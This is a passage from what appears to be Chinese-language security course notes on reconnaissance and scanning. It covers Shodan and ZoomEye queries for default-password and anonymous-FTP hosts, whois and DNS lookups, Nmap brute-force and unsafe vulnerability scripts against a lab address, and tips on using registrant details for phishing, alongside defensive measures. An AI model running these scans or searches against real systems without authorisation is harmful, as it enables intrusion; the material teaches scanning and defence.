class="line"></span><br><span class="line">ssh</span><br><span class="line">ssh default password</span><br><span class="line">ssh default password country:&quot;JP&quot; city:&quot;Tokyo&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#keyword</span><br><span class="line">基于关键词搜索的思路是根据banner(设备指纹)来搜索</span><br><span class="line">&quot;default password&quot; country:&quot;TH&quot;</span><br><span class="line">FTP anon successful</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#product</span><br><span class="line">product:&quot;Microsoft IIS httpd&quot;</span><br><span class="line">product:&quot;nginx&quot;</span><br><span class="line">product:&quot;Apache httpd&quot;</span><br><span class="line">product:MySQL</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#version</span><br><span class="line">product:MySQL version:&quot;5.1.73&quot;</span><br><span class="line">product:&quot;Microsoft IIS httpd&quot; version:&quot;7.5&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#hostname</span><br><span class="line">hostname:.org</span><br><span class="line">hostname:.edu</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#os</span><br><span class="line">os:&quot;Windows Server 2008 R2&quot;</span><br><span class="line">os:&quot;Windows 7 or 8&quot;</span><br><span class="line">os:&quot;Linux 2.6.x&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#net</span><br><span class="line">net:110.180.13.0/24</span><br><span class="line">200 ok net:110.180.13.0/24</span><br><span class="line">200 ok country:JP net:110.180.13.0/24</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#port</span><br><span class="line">port:3389</span><br><span class="line">port:445</span><br><span class="line">port:22</span><br></pre></td></tr></table></figure><p>远程桌面连接mstsc，好像要Win10专业版才行。</p><h6 id="10-3-1-4-3-Zoomeye-Hacking"><a href="#10-3-1-4-3-Zoomeye-Hacking" class="headerlink" title="10.3.1.4.3. Zoomeye Hacking"></a>10.3.1.4.3. Zoomeye Hacking</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">https://www.zoomeye.org</span><br><span class="line">ZoomEye(钟馗之眼)是一个面向网络空间的搜索引擎，“国产的shodan”。</span><br><span class="line"></span><br><span class="line">ipip:35.185.77.2</span><br><span class="line">osos:linux</span><br><span class="line">appapp:Apache httpd</span><br><span class="line">serviceservice:routersetup公网路由器</span><br><span class="line">portport:3389</span><br><span class="line">countrycountry:cn</span><br><span class="line">citycountry:cn +city:hangzhou</span><br><span class="line">verapp:Apache httpd +ver:2.2.16</span><br><span class="line">cidrcidr:35.185.77.2/24IP的CIDR网段</span><br><span class="line">hostnamehostname:google.com</span><br><span class="line">site</span><br><span class="line">title</span><br><span class="line">header</span><br><span class="line">keywords</span><br><span class="line">desc</span><br><span class="line"></span><br><span class="line">用户手册：https://www.zoomeye.org/help</span><br></pre></td></tr></table></figure><h6 id="10-3-1-4-1-4-元搜索引擎"><a href="#10-3-1-4-1-4-元搜索引擎" class="headerlink" title="10.3.1.4.1.4 元搜索引擎"></a>10.3.1.4.1.4 元搜索引擎</h6><p>集成多个搜索引擎进行信息收集</p><p>基于元搜索引擎实现被篡改网站发现</p><h6 id="10-3-1-4-1-5-防范措施"><a href="#10-3-1-4-1-5-防范措施" class="headerlink" title="10.3.1.4.1.5 防范措施"></a>10.3.1.4.1.5 防范措施</h6><ul><li>注意组织安全敏感信息以及个人隐私信息不要在因特网上随意发布</li><li>个人上网时尽量保持匿名</li><li>提供个人隐私信息时，应选择具有良好声誉并可信任的网站</li><li>定期对自身单位及个人在Web上的信息足迹进行搜索</li></ul><h5 id="10-3-1-4-2-DNS与IP查询"><a href="#10-3-1-4-2-DNS与IP查询" class="headerlink" title="10.3.1.4.2 DNS与IP查询"></a>10.3.1.4.2 DNS与IP查询</h5><h6 id="10-3-1-4-2-1-Whois查询"><a href="#10-3-1-4-2-1-Whois查询" class="headerlink" title="10.3.1.4.2.1 Whois查询"></a>10.3.1.4.2.1 Whois查询</h6><p>whois是用来查询域名注册所有者等信息的传输协议。</p><p>通过 whois 来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS 解析服务器、注册人联系电话等等，可以进行邮箱反查域名，爆破邮箱，社工，域名劫持，寻找旁站等等。</p><p><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><h6 id="10-3-1-4-2-2-备案信息"><a href="#10-3-1-4-2-2-备案信息" class="headerlink" title="10.3.1.4.2.2 备案信息"></a>10.3.1.4.2.2 备案信息</h6><p>网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，如果需要查询企业备案信息（单位名称、备案编号、网站负责人、电子邮箱、联系电话、法人等）。</p><p>利用技巧：</p><ul><li>DNS解析记录可以反查 IP，比较早的解析记录有时可以查到真实 IP，需要留意一下。</li><li>注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。</li></ul><p><a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></p><h6 id="10-3-1-4-2-3-DNS服务：从DNS到IP的映射"><a href="#10-3-1-4-2-3-DNS服务：从DNS到IP的映射" class="headerlink" title="10.3.1.4.2.3 DNS服务：从DNS到IP的映射"></a>10.3.1.4.2.3 DNS服务：从DNS到IP的映射</h6><p>先了解一下域名层级：以百度为例子：www.baidu.com。依次是com(顶级域名)、baidu(一级域名)、www(二级域名)。但是实质上还有一个唯一的根域名root：www.baidu.com.root，但由于root是唯一的，因此是否写root根域名不是特别必要。</p><p>DNS查询工具：</p><p>系统自带：nslookup(Windows)、dig(Linux)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;nslookup www.gzhu.edu.cn</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  202.192.18.10</span><br><span class="line"></span><br><span class="line">名称:    gzhu-edu-cn.cname.saaswaf.com</span><br><span class="line">Addresses:  2001:250:100d:ffac:121:194:14:82</span><br><span class="line">          2001:250:100d:ffac:121:194:14:83</span><br><span class="line">          2001:da8:2032:1006:10:0:213:50</span><br><span class="line">          2001:da8:2032:1006:10:0:213:51</span><br><span class="line">          58.205.213.52</span><br><span class="line">          121.194.14.85</span><br><span class="line">          121.194.14.84</span><br><span class="line">Aliases:  www.gzhu.edu.cn</span><br></pre></td></tr></table></figure><h6 id="10-3-1-4-2-4-IP-gt-location查询"><a href="#10-3-1-4-2-4-IP-gt-location查询" class="headerlink" title="10.3.1.4.2.4 IP-&gt;location查询"></a>10.3.1.4.2.4 IP-&gt;location查询</h6><p>IP地址到现实世界中的具体地理位置。</p><p>域名-&gt;IP地址-&gt;地理位置</p><p><a href="https://cz88.net/">https://cz88.net/</a></p><h6 id="10-3-1-4-2-5-防范措施"><a href="#10-3-1-4-2-5-防范措施" class="headerlink" title="10.3.1.4.2.5 防范措施"></a>10.3.1.4.2.5 防范措施</h6><ul><li><p>公用数据库中提供信息的安全问题</p><ul><li>必须向注册机构提供尽可能准确的信息</li></ul></li><li><p>采用一些安防措施不让攻击者轻易得手</p><ul><li><p>及时更新管理性事务联系人的信息</p></li><li><p>尝试使用虚构的人名来作为管理性事务联系人</p><p>HoneyMan：帮助发现和追查那些在电话或邮件中试图冒充虚构人名的“社会工程师”。</p></li><li><p>慎重考虑所列的电话号码和地址等信息</p></li><li><p>注意域名注册机构允许更新注册信息的方式，并确保其中关键信息的安全</p></li></ul></li></ul><h5 id="10-3-1-4-3-网络侦察"><a href="#10-3-1-4-3-网络侦察" class="headerlink" title="10.3.1.4.3 网络侦察"></a>10.3.1.4.3 网络侦察</h5><h6 id="10-3-1-4-3-1-Traceroute路由追踪"><a href="#10-3-1-4-3-1-Traceroute路由追踪" class="headerlink" title="10.3.1.4.3.1 Traceroute路由追踪"></a>10.3.1.4.3.1 Traceroute路由追踪</h6><ul><li>探测网络路由路径，可用于确定网络拓扑</li><li>主机发送TTL从1开始逐步增1的IP包，网络路径上路由器返回ICMP TIME_EXECEEDED</li><li>UNIX/Linux: traceroute<br>Windows: tracert</li><li>穿透防火墙: traceroute-S -p53 TARGET_IP</li><li>图形化界面工具: VisualRoute, NeoTrace, Trout</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;tracert www.gzhu.edu.cn</span><br><span class="line"></span><br><span class="line">通过最多 30 个跃点跟踪</span><br><span class="line">到 gzhu-edu-cn.cname.saaswaf.com [121.194.14.84] 的路由:</span><br><span class="line"></span><br><span class="line">  1     9 ms    13 ms     8 ms  172.29.255.254</span><br><span class="line">  2     *        *        *     请求超时。</span><br><span class="line">  3     *        *        *     请求超时。</span><br><span class="line">  4     *        *        *     请求超时。</span><br><span class="line">  5    12 ms     6 ms    11 ms  scn-rgw8.gznet.edu.cn [202.112.19.85]</span><br><span class="line">  6     6 ms    11 ms     8 ms  101.4.114.62</span><br><span class="line">  7     *        *        *     请求超时。</span><br><span class="line">  8     *        *        *     请求超时。</span><br><span class="line">  9     *        *        *     请求超时。</span><br><span class="line"> 10     *        *        *     请求超时。</span><br><span class="line"> 11     *        *        *     请求超时。</span><br><span class="line"> 12    62 ms    57 ms    67 ms  101.4.117.177</span><br><span class="line"> 13    60 ms    60 ms    58 ms  202.200.28.186</span><br><span class="line"> 14    59 ms    56 ms    57 ms  121.194.14.84</span><br><span class="line"></span><br><span class="line">跟踪完成。</span><br></pre></td></tr></table></figure><h3 id="10-3-2-网络扫描技术"><a href="#10-3-2-网络扫描技术" class="headerlink" title="10.3.2 网络扫描技术"></a>10.3.2 网络扫描技术</h3><div class="table-container"><table><thead><tr><th>网络扫描类型</th><th>网络扫描目的</th></tr></thead><tbody><tr><td>主机扫描</td><td>找出网段内活跃主机</td></tr><tr><td>端口扫描</td><td>找出主机上所开放的网络服务</td></tr><tr><td>操作系统/网络服务辨识</td><td>识别主机安装的操作系统类型与开放网络服务类型，以选择不同渗透攻击代码及配置</td></tr><tr><td>漏洞扫描</td><td>找出主机/网络服务上所存在的安全漏洞，作为渗透点</td></tr></tbody></table></div><h4 id="10-3-2-1-主机扫描-Ping扫描"><a href="#10-3-2-1-主机扫描-Ping扫描" class="headerlink" title="10.3.2.1 主机扫描(Ping扫描)"></a>10.3.2.1 主机扫描(Ping扫描)</h4><p>主机扫描目的：检查目标主机是否活跃</p><p>主机扫描方式：</p><ul><li>传统ICMP Ping扫描</li><li>ACK Ping扫描</li><li>SYN Ping扫描</li><li>UDP Ping扫描：到关闭端口</li></ul><p>主机扫描程序：</p><ul><li>Ping</li><li>Nmap：-sP选项，缺省执行，集合了以上几种扫描方式</li></ul><p>Ping扫射：同时扫描大量地IP地址段，以发现某个IP地址是否绑定活跃主机的扫描。</p><p>主机扫描防范措施：</p><p>单一主机Ping扫描很常见，危害性也不大，更关注Ping扫射。</p><p>监测：网络入侵检测系统Snort；主机扫描监测工具Scanlogd</p><p>防御：仔细考虑对ICMP通信的过滤策略<br>利用Ping构建后门: loki(Phrackv51#06), pingd</p><h4 id="10-3-2-2-端口扫描"><a href="#10-3-2-2-端口扫描" class="headerlink" title="10.3.2.2 端口扫描"></a>10.3.2.2 端口扫描</h4><p>端口：TCP/UDP(1-64K)，运行网络应用服务</p><p>端口分类：</p><ol><li>知名端口0-1023(Well_Known Ports)</li></ol><ul><li>80/TCPHTTP(超文本传输协议)：用于传输网页</li><li>81/TCPHTTP预备(超文本传输协议)</li><li>443/TCPHTTPS(超文本安全传输协议)</li></ul><ol><li>注册端口为1024-49151(Registered Ports)</li></ol><ul><li>4433/tcp, udp             Microsoft SQL database system </li><li>1434/tcp, udp             Microsoft SQL Monitor</li></ul><ol><li>动态端口或私有端口为49152-65535(Dynamic Ports)</li></ol><ul><li>这些端口号一般不固定分配给某个服务，只要运行的程序向系统提出访问网络的申请，那么系统就可以从这些端口号中分配一个供该程序使用。</li></ul><p>连接目标主机的TCP和UDP端口，确定哪些服务正在运行即处于监听状态的过程。</p><p>端口扫描目的：</p><ul><li>防御者－更加了解所管理的网络状况，找出没有必要开放的端口并关闭，这是保证业务网络安全的第一步。</li><li>攻击者－找出可供进一步攻击的网络服务，同时结合操作系统探测技术也可以确定目标主机所安装的操作系统版本。开放网络服务和操作系统版本信息为攻击者提供了破解攻击的目标，使其更容易找出进入目标主机的漏洞路径。</li></ul><h5 id="10-3-2-2-1-TCP连接扫描"><a href="#10-3-2-2-1-TCP连接扫描" class="headerlink" title="10.3.2.2.1 TCP连接扫描"></a>10.3.2.2.1 TCP连接扫描</h5><ul><li>调用connect() socket函数连接目标端口</li><li>开放端口：完成完整的TCP三次握手(SYN, SYN|ACK, ACK)，timeout/RST</li><li>关闭端口：SYN, RST</li><li>优势&amp;弱势：无需特权用户权限可发起，目标主机记录大量连接和错误信息，容易检测</li></ul><h5 id="10-3-2-2-2-SYN扫描"><a href="#10-3-2-2-2-SYN扫描" class="headerlink" title="10.3.2.2.2 SYN扫描"></a>10.3.2.2.2 SYN扫描</h5><ul><li>半开扫描(half-open scanning)</li><li>开放端口：攻击者SYN, 目标主机SYN|ACK, 攻击者立即反馈RST包关闭连接</li><li>关闭端口：攻击者SYN, 目标主机RST</li><li>优势&amp;弱势：目标主机不会记录未建立连接，较为隐蔽，需根用户权限构建定制SYN包</li></ul><h5 id="10-3-2-2-3-隐蔽端口扫描"><a href="#10-3-2-2-3-隐蔽端口扫描" class="headerlink" title="10.3.2.2.3 隐蔽端口扫描"></a>10.3.2.2.3 隐蔽端口扫描</h5><p>TCP连接扫描和SYN扫描并不隐蔽：防火墙会监控发往受限端口的SYN包。</p><p>隐蔽端口扫描通过构造特殊的TCP标志位，以躲避检测，同时达成端口扫描目的。</p><p>FIN扫描(只带FIN位), Null扫描(全为0), XMAS扫描(FIN/URG/PUSH)<br>FTP弹射扫描：利用FTP代理选项达到隐蔽源地址</p><ul><li>开放端口：标准TCP协议规范，接受这些伪造TCP包，丢弃，无任何反馈</li><li>关闭端口：反馈RST包</li></ul><p>Windows/Cisco等系统没有遵从规范，开放端口对于伪造TCP包也反馈RST，以上这三种方法不适用。</p><h5 id="10-3-2-2-4-UDP端口扫描"><a href="#10-3-2-2-4-UDP端口扫描" class="headerlink" title="10.3.2.2.4 UDP端口扫描"></a>10.3.2.2.4 UDP端口扫描</h5><ul><li>对目标端口发送特殊定制的UDP数据报文</li><li>开放端口: UDP反馈</li><li>关闭端口: ICMP port unreachable报文</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU</span><br></pre></td></tr></table></figure><h5 id="10-3-2-2-5-防范措施"><a href="#10-3-2-2-5-防范措施" class="headerlink" title="10.3.2.2.5 防范措施"></a>10.3.2.2.5 防范措施</h5><ul><li><p>任何攻击技术都是双刃剑</p><p>网络管理员也可利用端口扫描确定开放必要服务</p></li><li><p>端口扫描的监测<br>网络入侵检测系统: Snort中的portscan检测插件<br>系统扫描检测工具: scanlogd, PortSentry, Genius</p></li><li><p>端口扫描的预防</p><ul><li>开启防火墙<br>类UNIX: netfilter/IPTables, Win32: 个人防火墙</li><li>禁用所有不必要的服务,尽可能减少暴露面(进一步的受攻击面)<br>类UNIX: /etc/inetd.conf，Win32: 控制面板/服务</li></ul></li></ul><h5 id="10-3-2-2-6-目录扫描"><a href="#10-3-2-2-6-目录扫描" class="headerlink" title="10.3.2.2.6 目录扫描"></a>10.3.2.2.6 目录扫描</h5><p>目录扫描要有字典，相当于暴力破解，扫描是否有字典中的目录。kali下的目录扫描工具：dirb/dirsearch</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.137.146/mutillidae</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -u www.XXX.com -e*(-e参数也可不指定语言，用*号表示所有语言)</span><br></pre></td></tr></table></figure><p>返回CODE:200才可以进去此目录。</p><h4 id="10-3-2-3-系统类型探查"><a href="#10-3-2-3-系统类型探查" class="headerlink" title="10.3.2.3 系统类型探查"></a>10.3.2.3 系统类型探查</h4><p>系统类型探查：探查活跃主机的系统及开放网络服务的类型</p><ol><li>目标主机上运行着何种类型什么版本的操作系统</li><li>各个开放端口上监听的是哪些网络服务</li></ol><p>目的：</p><ul><li>为更为深入的情报信息收集，真正实施攻击做好准备</li><li>如远程渗透攻击需了解目标操作系统类型与配置</li></ul><h5 id="10-3-2-3-1-操作系统类型探查"><a href="#10-3-2-3-1-操作系统类型探查" class="headerlink" title="10.3.2.3.1 操作系统类型探查"></a>10.3.2.3.1 操作系统类型探查</h5><p>通过各种不同操作系统类型和版本实现机制上的差异：</p><ul><li>协议栈实现差异－协议栈指纹鉴别</li><li>开放端口的差异－端口扫描</li><li>应用服务的差异－旗标攫取</li></ul><p>通过特定方法以确定目标主机所安装的操作系统类型和版本的技术手段。</p><p>明确操作系统类型和版本是进一步进行安全漏洞发现和渗透攻击的必要前提。</p><p>辨识方式：</p><p>–主动－操作系统主动探测技术</p><p>–被动－被动操作系统识别技术</p><h6 id="10-3-2-3-1-1-利用网络协议栈指纹识别OS"><a href="#10-3-2-3-1-1-利用网络协议栈指纹识别OS" class="headerlink" title="10.3.2.3.1.1 利用网络协议栈指纹识别OS"></a>10.3.2.3.1.1 利用网络协议栈指纹识别OS</h6><p>Ping中的TTL。TTL：生存时间</p><div class="table-container"><table><thead><tr><th>操作系统</th><th>TTL</th></tr></thead><tbody><tr><td>LINUX</td><td>64</td></tr><tr><td>WIN2K/NT</td><td>128</td></tr><tr><td>WINDOWS系列</td><td>32</td></tr><tr><td>UNIX系列</td><td>255</td></tr></tbody></table></div><p>现实中的TTL值可能都不是以上数值，跟哪个接近就判断是哪个系统。</p><h5 id="10-3-2-3-2-网络服务类型探查"><a href="#10-3-2-3-2-网络服务类型探查" class="headerlink" title="10.3.2.3.2 网络服务类型探查"></a>10.3.2.3.2 网络服务类型探查</h5><p>确定目标网络中开放端口上绑定的网络应用服务类型和版本。</p><p>了解目标系统更丰富信息, 可支持进一步的操作系统辨识和漏洞识别。</p><p>网络服务主动探测：旗标抓取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV</span><br></pre></td></tr></table></figure><p>网络服务被动识别：特征匹配PADS</p><h5 id="10-3-2-3-3-防范措施"><a href="#10-3-2-3-3-防范措施" class="headerlink" title="10.3.2.3.3 防范措施"></a>10.3.2.3.3 防范措施</h5><p>并没有太多好办法。应立足于即使攻击者探查出了操作系统和网络服务类型，也不能轻易的攻破这道“坚固的防线”。</p><h4 id="10-3-2-4-Nmap"><a href="#10-3-2-4-Nmap" class="headerlink" title="10.3.2.4 Nmap"></a>10.3.2.4 Nmap</h4><p>nmap是安全渗透领域最强大的开源端口扫描器，能跨平台支持运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://nmap.org</span><br><span class="line">http://sectools.org</span><br></pre></td></tr></table></figure><p>扫描示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">主机发现nmap -sn 192.168.137.144/24</span><br><span class="line">端口扫描nmap -sS -p1-1000 192.168.137.144</span><br><span class="line">系统扫描nmap -O 192.168.137.144</span><br><span class="line">网络服务扫描   nmap -sV 192.168.137.144</span><br><span class="line">综合扫描nmap -A 192.168.137.144</span><br><span class="line"></span><br><span class="line">脚本扫描/usr/share/nmap/scripts</span><br><span class="line">nmap --script=default 192.168.137.144</span><br><span class="line">nmap --script=auth 192.168.137.144</span><br><span class="line">nmap --script=brute 192.168.137.144</span><br><span class="line">nmap --script=vuln 192.168.137.144</span><br><span class="line">nmap --script=broadcast 192.168.137.144</span><br><span class="line">nmap --script=smb-brute.nse 192.168.137.144</span><br><span class="line">nmap --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.144</span><br><span class="line">nmap --script=smb-vuln-conficker.nse --script-args=unsafe=1 192.168.137.144</span><br><span class="line">nmap -p3306 --script=mysql-empty-password.nse 192.168.137.144</span><br></pre></td></tr></table></figure><p>UDP、ICMP首部长度8byte，TCP、IP首部长度20byte</p><p>zenmap——图形化nmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap T4 -A -v 192.168.137.144</span><br><span class="line">-T设置速度等级，1-5级，数字越大速度越快</span><br><span class="line">-A综合扫描</span><br><span class="line">-v输出扫描过程</span><br></pre></td></tr></table></figure><h4 id="10-3-2-5-漏洞扫描"><a href="#10-3-2-5-漏洞扫描" class="headerlink" title="10.3.2.5 漏洞扫描"></a>10.3.2.5 漏洞扫描</h4><p>系统攻防的核心：安全漏洞、Exploit(渗透攻击)/恶意代码、安全防御与检测机制三者之间的技术博弈。</p><p>漏洞扫描技术：</p><ul><li>检查系统是否存在已公布安全漏洞，从而易于遭受网络攻击的技术。</li><li>双刃剑<br>-网络管理员用来检查系统安全性，渗透测试团队(Red Team)用于安全评估。<br>-攻击者用来列出最可能成功的攻击方法，提高攻击效率。</li></ul><p>已发布安全漏洞数据库：</p><ul><li><p>业界标准漏洞命名库Common Vulnerabilities and Exposures([CVE][<a href="http://cve.mitre.org">http://cve.mitre.org</a>])</p><ul><li>一本漏洞字典，为大家广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。</li><li>CVE标准使用一个共同的名字，帮助用户在各自独立的各种漏洞数据库中和漏洞评估工具中共享数据，虽然这些工具很难整合在一起。</li></ul></li><li><p>National Vulnerability Database([NVD][ <a href="https://nvd.nist.gov">https://nvd.nist.gov</a> ])</p></li><li>国家信息安全漏洞共享平台([CNVD][•<a href="https://www.cnvd.org.cn">https://www.cnvd.org.cn</a>])</li></ul><p>The Common Vulnerability Scoring System(CVSS)</p><ul><li>基本分：漏洞固有的、根本性的属性</li><li>时间分：漏洞与时间相关的属性</li><li>环境分：不同用户环境中产品安全漏洞所造成的危害程度</li></ul><div class="table-container"><table><thead><tr><th>等级</th><th>CVSS分数</th></tr></thead><tbody><tr><td>None</td><td>0</td></tr><tr><td>Low</td><td>0.1-3.9</td></tr><tr><td>Medium</td><td>4.0-6.9</td></tr><tr><td>High</td><td>7.0-8.9</td></tr><tr><td>Critical</td><td>9.0-10.0</td></tr></tbody></table></div><h5 id="10-3-2-4-1-漏洞扫描软件"><a href="#10-3-2-4-1-漏洞扫描软件" class="headerlink" title="10.3.2.4.1 漏洞扫描软件"></a>10.3.2.4.1 漏洞扫描软件</h5><h6 id="10-3-2-4-1-1-Nessus"><a href="#10-3-2-4-1-1-Nessus" class="headerlink" title="10.3.2.4.1.1 Nessus"></a>10.3.2.4.1.1 Nessus</h6><p>目前最优秀的共享漏洞扫描软件<a href="http://www.nessus.org/">http://www.nessus.org/</a></p><p>一个功能强大而又易于使用的网络漏洞扫描工具，运行于 Linux, Windows, OSX, BSD, Solaris等系统。    </p><p>该系统被设计为客户/服务器模式，服务器端负责进行安全扫描，客户端用来配置、管理服务器端，客户端和服务器端之间的通信使用SSL加密。</p><p>第一个使用插件的漏洞扫描工具，支持实时的插件升级，具有检测漏洞多、准确、速度快的特点使其在众多漏洞扫描器中脱颖而出。其强大的功能是依赖于其丰富的插件来实现的。</p><p>客户端/服务器模式</p><ul><li>服务器端: nessesd(Tcp1241)</li><li>客户端: nessus-q (命令行客户端), nessus(UNIX图形客户端), Nessus Client(Win32客户端)</li></ul><p>框架/插件模式</p><ul><li>安全漏洞扫描插件: 使用NASL语言容易编写并集成至Nessus框架中</li><li>插件间可互相依赖和协同工作(端口探测－漏洞扫描插件)</li></ul><p>NASL语言(Nessus Attack Scripting Language)</p><p>多种报告方式：<br>文本/LaTeX/HTML/DHTML/XML/SQL等</p><p>Nessus体系结构：</p><p>(1)客户端程序向服务端程序发送详细的扫描任务的参数(遵循nessus传输协议)；</p><p>(2)服务端程序接收到客户端程序的请求后，加载完成任务所需要的插件，并合理安排插件的执行顺序；</p><p>(3)NASL语言解释器执行插件，在执行插件扫描过程中会与扫描目标之间有一些数据交互；</p><p>(4)NASL解释器判断扫描结果，并报告给服务端程序；</p><p>(5)服务端程序归纳从NASL解释器收到的扫描结果，生成漏洞报告反馈给客户端程序。</p><h6 id="10-3-2-4-1-2-AWVS"><a href="#10-3-2-4-1-2-AWVS" class="headerlink" title="10.3.2.4.1.2 AWVS"></a>10.3.2.4.1.2 AWVS</h6><p>通过网络爬虫测试你的网站安全，检测流行安全漏洞。</p><h6 id="10-3-2-4-1-3-AppScan"><a href="#10-3-2-4-1-3-AppScan" class="headerlink" title="10.3.2.4.1.3 AppScan"></a>10.3.2.4.1.3 AppScan</h6><h6 id="10-3-2-4-1-4-BurpSuite"><a href="#10-3-2-4-1-4-BurpSuite" class="headerlink" title="10.3.2.4.1.4 BurpSuite"></a>10.3.2.4.1.4 BurpSuite</h6><p>功能模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">target目标模块用于设置扫描域、生成站点地图、生成安全分析</span><br><span class="line">proxy代理模块用于拦截浏览器的http会话内容</span><br><span class="line">spider爬虫模块用于自动爬取网站的每个页面内容，并生成完成的网站地图</span><br><span class="line">scanner扫描模块用于自动化检测漏洞，分为主动和被动扫描</span><br><span class="line">intruder入侵模块根据上面检测到的可能存在漏洞的链接，调用攻击载荷，对目标链接进行攻击</span><br><span class="line">入侵模块的原理是根据访问链接中存在的参数/变量，调用本地词典、攻击载荷，对参数进行渗透测试</span><br><span class="line">repeater重放模块用于实现请求重放，通过修改参数进行手工请求回应的调试</span><br><span class="line">sequencer序列器模块用于检测参数的随机性，例如密码或者令牌是否可预测，以此判断关键数据是否可被伪造</span><br><span class="line">decoder解码器模块用于实现对URL、HTML、Base64、ASCII、二八十六进制、哈希等编码转换</span><br><span class="line">comparer对比模块用于对两次不用的请求和回应进行可视化对比，以此区分不同参数对结果造成的影响</span><br><span class="line">extender通过拓展模块，可以加载自己开发的、或者第三方模块，打造自己的burpsuite功能</span><br><span class="line">通过burpsuite提供的API接口，目前可以支持Java、Python、Ruby三种语言的模块编写</span><br><span class="line">options分为project/user options，主要对软件进行全局设置</span><br><span class="line">alerts显示软件的使用日志信息</span><br></pre></td></tr></table></figure><h6 id="10-3-2-4-1-5-OpenVAS"><a href="#10-3-2-4-1-5-OpenVAS" class="headerlink" title="10.3.2.4.1.5 OpenVAS"></a>10.3.2.4.1.5 OpenVAS</h6><p>开放式漏洞评估系统，是一个用于评估目标漏洞的杰出框架，开源且功能十分强大。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.openvas.org</span><br><span 